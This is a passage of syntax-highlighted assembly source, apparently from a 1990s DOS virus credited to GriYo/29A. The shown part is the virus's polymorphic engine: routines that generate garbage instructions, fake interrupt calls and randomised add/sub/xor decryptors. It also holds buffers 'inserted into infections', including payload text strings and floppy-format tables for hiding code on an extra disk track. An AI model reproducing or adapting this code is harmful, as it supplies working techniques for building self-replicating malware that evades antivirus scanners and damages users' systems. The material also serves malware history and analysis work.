</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">make_math_with_mem</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Generate a mov reg,mem or mov mem.reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mov_with_mem</span><span class="sc0">

                </span><span class="sc1">;Perform transformation</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Preserve address mode info</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">     
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">

                </span><span class="sc1">;Get a math opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Set address mode bits</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Restore pointer</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a random int 21h call                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_int_21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">

                </span><span class="sc1">;Choose within ah,function or ax,function+subfunction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_int_ax</span><span class="sc0">
</span><span class="sc5">do_int_ah</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">end_ah_table</span><span class="sc4">-</span><span class="sc5">ah_table</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ah_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Do not generate same int's in a row</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_int_ah</span><span class="sc0">

                </span><span class="sc1">;Generate mov ah,function        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Generate int 21h        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">021CDh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">do_int_ax</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_ax_table</span><span class="sc4">-</span><span class="sc5">ax_table</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ax_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Do not generate same int's in a row</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_int_ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

                </span><span class="sc1">;Generate mov ax,function</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Generate int 21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">021CDh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a do-nothing int call                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_fake_int</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fake_int_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fake_int_table</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">fake_int_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Polymorphic generator data buffer                                         ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">ah_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Int 21h garbage functions ( function number in ah )</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Bh</span><span class="sc0">         </span><span class="sc1">;Read entry state</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc0">         </span><span class="sc1">;Get current drive</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc0">         </span><span class="sc1">;Get current date</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02Ch</span><span class="sc0">         </span><span class="sc1">;Get current time</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">         </span><span class="sc1">;Get dos version number</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04Dh</span><span class="sc0">         </span><span class="sc1">;Get error code</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">051h</span><span class="sc0">         </span><span class="sc1">;Get active psp</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc0">         </span><span class="sc1">;Get active psp</span><span class="sc0">
</span><span class="sc5">end_ah_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ax_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Int 21h garbage functions ( function number in ax )</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">3300h</span><span class="sc0">        </span><span class="sc1">;Get break-flag</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">3700h</span><span class="sc0">        </span><span class="sc1">;Get line-command separator</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5800h</span><span class="sc0">        </span><span class="sc1">;Get mem concept</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5802h</span><span class="sc0">        </span><span class="sc1">;Get umb insert</span><span class="sc0">
</span><span class="sc5">end_ax_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">bytes_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Push and pop pairs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">end_bytes_2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">step_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Steps table</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_subroutine</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_call_garbage</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_branch</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sub_decryptor</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">next_decryptor</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_push_g_pop</span><span class="sc0">
</span><span class="sc5">end_step_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">instruction_table</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Polymorphic decryptor table</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_load_counter</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_load_pointer</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_decrypt_one</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_inc_pointer</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_dec_loop</span><span class="sc0">

</span><span class="sc5">end_inst_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">op_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Address of op-code generator routines</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">move_imm</span><span class="sc0">     
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mov_with_mem</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">make_math_with_mem</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_exchange</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_push_pop</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_int_21h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_fake_int</span><span class="sc0">
</span><span class="sc5">end_op_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">one_byte_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;One byte instructions for .sys decryptor</span><span class="sc0">
                </span><span class="sc6">aaa</span><span class="sc0">
                </span><span class="sc6">aas</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">daa</span><span class="sc0">
                </span><span class="sc6">das</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">

</span><span class="sc5">end_byte_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fake_int_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Do-nothing ints</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">
</span><span class="sc5">fake_int_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">decrypt_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Opcode table for add/sub/xor byte ptr seg:[di+displ],reg</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                      </span><span class="sc1">;Add / sub</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                      </span><span class="sc1">;Sub / add</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                      </span><span class="sc1">;Xor / xor</span><span class="sc0">

</span><span class="sc5">end_decrypt_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fast_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Opcode table for add/sub/xor byte ptr seg:[di+displ],key</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">                      </span><span class="sc1">;Add / sub</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6Dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                      </span><span class="sc1">;Sub / add</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">                      </span><span class="sc1">;Xor / xor</span><span class="sc0">
</span><span class="sc5">end_fast_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus buffers ( inserted into infections )                                ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">


                        </span><span class="sc1">;Text for payload subroutine</span><span class="sc0">
</span><span class="sc5">txt_credits_1</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"&lt;&lt;&lt; SuckSexee Automated Intruder &gt;&gt;&gt;"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">txt_credits_2</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Viral Implant Bio-Coded by GriYo/29A"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                        </span><span class="sc1">;Ddpt that enables the extra track</span><span class="sc0">
</span><span class="sc5">floppy5_25</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">1Bh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">floppy3_5</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">1Bh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">6Ch</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">

                        </span><span class="sc1">;Format table for a extra track in floppy</span><span class="sc0">
</span><span class="sc5">format_table</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 01h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 02h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 03h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 04h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 05h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 06h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 07h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">;Track 50h sector 08h</span><span class="sc0">
